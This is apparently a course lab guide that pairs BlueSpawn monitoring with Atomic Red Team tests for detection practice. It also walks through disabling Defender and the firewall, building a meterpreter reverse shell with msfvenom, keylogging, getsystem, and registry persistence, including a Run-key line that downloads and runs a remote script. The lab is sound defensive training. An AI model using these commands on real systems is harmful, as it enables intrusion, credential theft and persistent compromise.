![image](https://github.com/user-attachments/assets/068fae26-6e8f-402f-ad69-63a4e6a1f59e)

---

This is a lab from **John Strand**'s **Active Defense and Cyber Deception** Course:

https://www.antisyphontraining.com/product/active-defense-and-cyber-deception-with-john-strand/

---

# Atomic Red Team And Bluespawn

In this lab we will be using Bluespawn as a stand-in for an EDR system.  Normally full EDRs like Cylance and Crowdstrike are very expensive and tend not to show up in classes like this.  However, the folks at University of Virginia have done an outstanding job with BlueSpawn. 

BlueSpawn will monitor the system for "weird" behavior and note it when it occurs. For the money, it is great.

In this lab, we will be starting BlueSpawn and then running Atomic Red Team to trigger a lot of alerts.

First, we need to disable Defender. 
Start by opening up <b>Windows Powershell</b>.

<img width="365" height="195" alt="image" src="https://github.com/user-attachments/assets/ed27c1ce-6e3d-4436-8567-494b4da79d49" />

Next, run the following commands:

```ps
Set-MpPreference -DisableRealtimeMonitoring $true
```

```ps
Set-MpPreference -DisableBehaviorMonitoring $true
```

<img width="824" height="155" alt="2026-03-26_09-47" src="https://github.com/user-attachments/assets/d83571b4-0a39-4e4b-a9ef-cf6763954e2c" />


This will disable Defender for this session.

>[!NOTE]
>
>If you get angry red errors, that is Ok, it means Defender is not running.


Now, let's open a **command prompt**:

<img width="370" height="195" alt="image" src="https://github.com/user-attachments/assets/f8875993-3492-4208-9fd6-617283ea298f" />
 
Next, let’s change directories to tools and start Bluespawn:

```bash
cd \IntroLabs
```

```bash
BLUESPAWN-client-x64.exe --monitor --aggressiveness cursory
```

You should see something like this:

<img width="862" height="638" alt="2026-03-26_09-50" src="https://github.com/user-attachments/assets/a3419596-b4ca-4ea1-8d2a-832046873f76" />

If you made it this far, perfect! That means Bluespawn is up and running.

Now, let’s use Atomic Red Team to test the monitoring with BlueSpawn:

First, we need to open a PowerShell terminal. 

You can do this by selecting the icon in the taskbar/desktop:

<img width="365" height="195" alt="image" src="https://github.com/user-attachments/assets/ed27c1ce-6e3d-4436-8567-494b4da79d49" />

Now we need to install and update Atomic Red Team. Run the following:

```bash
cd \
```

```ps
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing);
Install-AtomicRedTeam -getAtomics -Force
```

>[!NOTE]
>
> This can take a bit. After about 120 seconds, try hitting enter to get your prompt back.

Once you see the following, you are set to move forward:

<img width="1100" height="292" alt="2026-03-26_09-54" src="https://github.com/user-attachments/assets/41cb6202-0911-480c-bb68-0953bf66a213" />


Next, in the PowerShell Window we need to navigate to the Atomic Red Team directory and import the powershell modules:

```ps
cd C:\AtomicRedTeam\invoke-atomicredteam\
```

Then, install the proper `yaml` modules by running the following:

```ps
Install-Module -Name powershell-yaml
```

>[!NOTE]
>
>When prompted, press Y to install the modules.

```ps
Import-Module .\Invoke-AtomicRedTeam.psm1
```


Once we do this, we need to invoke all the Atomic Tests.

>[!IMPORTANT]  
>
>Don't do this in production...  Ever.
>  
>Always run tools like Atomic Red Team on test systems.
>
>We recommend that you run in on a system with your EDR/Endpoint protection in non-blocking/alerting mode. This is so you can see what the protection would have done, but it will allow the tests to finish so we are just going to run individual tests for now.

Run the following individually. The test selections below were chosen to demonstrate several persistence
techniques while avoiding Atomic tests that are unstable with BLUESPAWN monitor mode in this lab environment:

```ps
Invoke-AtomicTest T1547.004
```

More information here:

https://attack.mitre.org/techniques/T1547/004/

```ps
Invoke-AtomicTest T1543.003
```

More information here:

https://attack.mitre.org/techniques/T1543/003/

You can also specify which tests you want to run:

```ps
Invoke-AtomicTest T1547.001 -TestNumbers 1,9,11,12
```

Each test uses a different mechanism : 

- 1 - Registry Run key
- 7 - Executable shortcut in the Startup folder
- 9 - SystemBC through registry type Persistence
- 11 - Using User Shell Folders to modify the Startup path

More information here:

https://attack.mitre.org/techniques/T1547/001/


```ps
Invoke-AtomicTest T1546.008 -TestNumbers 1
```

More information here:

https://attack.mitre.org/techniques/T1546/008/


>[!TIP]
>
>If you get any “file exists” questions or errors, just select `Yes`.

It should look like this:

<img width="936" height="478" alt="image" src="https://github.com/user-attachments/assets/18ddba81-7d21-4875-9ccf-c447eb58d665" />

>[!NOTE]
>
>There might be some errors when this runs. This is normal.

> [!IMPORTANT]
>
> The Atomic Red Team commands in this lab have already been updated to use
> the current MITRE ATT&CK technique and sub-technique IDs.
>
> The updated BLUESPAWN release also uses the current ATT&CK technique names.
>
> The official MITRE ATT&CK sub-technique crosswalk is available here for
> historical reference:
>
> https://attack.mitre.org/docs/subtechniques/subtechniques-crosswalk.json


You should be getting a lot of alerts with Bluespawn! Switch tabs in your Terminal to see them:

<img width="919" height="668" alt="image" src="https://github.com/user-attachments/assets/a8d22653-5baf-4f64-bbaa-bacc04befedb" />

Now, let’s go back to the PowerShell window and clean up:

```ps
Invoke-AtomicTest T1547.004 -Cleanup
Invoke-AtomicTest T1543.003 -Cleanup
Invoke-AtomicTest T1547.001 -TestNumbers 1,9,11,12 -Cleanup
Invoke-AtomicTest T1546.008 -TestNumbers 1 -Cleanup
```

> [!NOTE]
>
> The cleanup for `T1547.004-3` may time out after 120 seconds.
> This test uses the legacy Winlogon Notify persistence mechanism, which is not
> supported on modern Windows versions.
>
> The timeout does not prevent the remaining cleanup tests from continuing.

It should look like this:

<img width="781" height="529" alt="image" src="https://github.com/user-attachments/assets/5932de02-775a-4e2a-b2e4-bd976a0dc2e3" />


# If you have more time

Let’s begin by disabling **Defender**. Simply run the following from an **Administrator PowerShell** prompt:

<img width="365" height="195" alt="image" src="https://github.com/user-attachments/assets/ed27c1ce-6e3d-4436-8567-494b4da79d49" />

Next, run the following command in the **Powershell** terminal:

```ps
Set-MpPreference -DisableRealtimeMonitoring $true
```

<img width="820" height="139" alt="2026-03-26_10-20" src="https://github.com/user-attachments/assets/446b50ed-75b5-4e04-a505-559833112aa1" />


This will disable **Defender** for this session.

If you get angry red errors, that is **Ok**, it means **Defender** is not running.

Open **Command Prompt**

<img width="370" height="195" alt="image" src="https://github.com/user-attachments/assets/f8875993-3492-4208-9fd6-617283ea298f" />

Next, lets ensure the firewall is disabled. In a Windows Command Prompt.

```cmd
netsh advfirewall set allprofiles state off
```

Next, set a password for the Administrator account that you can remember

```bash
net user Administrator password1234
```

Please note, that is a very bad password.  Come up with something better. But, please remember it.

Let's continue by opening an **Ubuntu** terminal

<img width="384" height="400" alt="image" src="https://github.com/user-attachments/assets/eb8beb6f-5bf9-4294-9b32-2306ad1c002e" />


Become root:

```bash
sudo su -
```

Before we run the next commands, we need to get the **IP** of our **Linux System**. Lets do so by running the following:

```bash
ifconfig
```

<img width="822" height="172" alt="image" src="https://github.com/user-attachments/assets/2b1c4aaf-cc64-4ecb-9763-84aada0c6a1c" />

**REMEMBER: YOUR IP WILL BE DIFFERENT**

Run the following commands to start a simple backdoor and backdoor listener: 

```bash
cd /tmp/
```


Run the following commands to start a simple backdoor and backdoor listener: 

```bash
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe > /tmp/TrustMe.exe
```

<img width="934" height="119" alt="image" src="https://github.com/user-attachments/assets/fd99899d-5962-4fcf-973e-18ab23db5ae2" />

Now let's start the **Metasploit** Handler

```bash
msfconsole -q
```

We are going to run the following commands to correctly set the parameters:

```bash
use exploit/multi/handler
```

```bash
set PAYLOAD windows/meterpreter/reverse_tcp
```

```bash
set LHOST [Your Linux IP Address]
```

Remember, **Your IP will be different!**

```bash
exploit
```

It should look like this:

<img width="738" height="237" alt="image" src="https://github.com/user-attachments/assets/c0f71b47-4b0b-4b37-b016-0851c5932845" />

Open up a **Powershell** terminal, copy the file over from **Linux**

```ps
cd .\Desktop\
```

```ps
scp ubuntu@linux.cloudlab.lan:/tmp/TrustMe.exe .
```

Open a **Command Prompt**

<img width="370" height="195" alt="image" src="https://github.com/user-attachments/assets/f8875993-3492-4208-9fd6-617283ea298f" />


Let's run the following commands to run the **"TrustMe.exe"** file.

```cmd
cd \Users\Administrator\Desktop
```
 
Then run it with the following:

```cmd
TrustMe.exe
```

Back at your Ubuntu terminal, you should have a metasploit session!

<img width="940" height="466" alt="image" src="https://github.com/user-attachments/assets/8458c8b8-63fc-4749-9d74-730f205cd773" />

Now, let’s look at keystroke logging.

To learn more about this check out MITRE:

https://attack.mitre.org/techniques/T1056/

Also, below is a list of just some of the threat groups that use this technique:

<img width="1072" height="723" alt="image" src="https://github.com/user-attachments/assets/c005128b-124b-4bcc-9bf7-8516ca4be2d6" />


Run commands

meterpreter > `keyscan_start`

Go and type something on your Windows system.

meterpreter > `keyscan_dump`

![](attachments/Clipboard_2020-06-15-13-52-00.png)


Go and check Bluespawn.  Did it detect it?

Now, let’s play with registry persistence.

To learn more about this check out MITRE:

https://attack.mitre.org/techniques/T1547/

Here are just some of the groups that use this technique:

<img width="1072" height="533" alt="image" src="https://github.com/user-attachments/assets/86040c18-29cd-4d16-95dd-84e45dcb1f63" />


meterpreter > `shell`

C:\Users\Administrator\Desktop> `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Payload /d "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://[Your Linux IP Address]:80/a'))\"" /f`

C:\Users\Administrator\Desktop> `reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe"`

<img width="1514" height="880" alt="image" src="https://github.com/user-attachments/assets/bc7ffe81-a9c5-42d5-b565-e9a640eb5301" />

Go and check Bluespawn.  Did it detect it?

Next, let’s play with privilege escalation.

Here is al link to more info about this from MITRE:

https://attack.mitre.org/techniques/T1543/

Here are just some of the groups that use this technique:

<img width="1087" height="489" alt="image" src="https://github.com/user-attachments/assets/41b91eb5-8505-48a3-bee0-09cbb87f9dca" />


meterpreter >`getsystem`

<img width="685" height="82" alt="image" src="https://github.com/user-attachments/assets/fffb4bd8-3cd5-4b9d-b4aa-bde75e26dca2" />

<img width="1500" height="560" alt="image" src="https://github.com/user-attachments/assets/eb3352e1-2793-4ac3-9bc4-9a0f747c4a0f" />

Go and check Bluespawn.  Did it detect it?

***                                                                 
<b><i>Looking for a different lab? </br>[Lab Directory](/IntroClassFiles/navigation.md)</i></b>

***Finished with the Labs?***

Please be sure to destroy the lab environment!

[Click here for instructions on how to destroy the Lab Environment](/IntroClassFiles/Tools/IntroClass/LabDestruction/labdestruction.md)

---










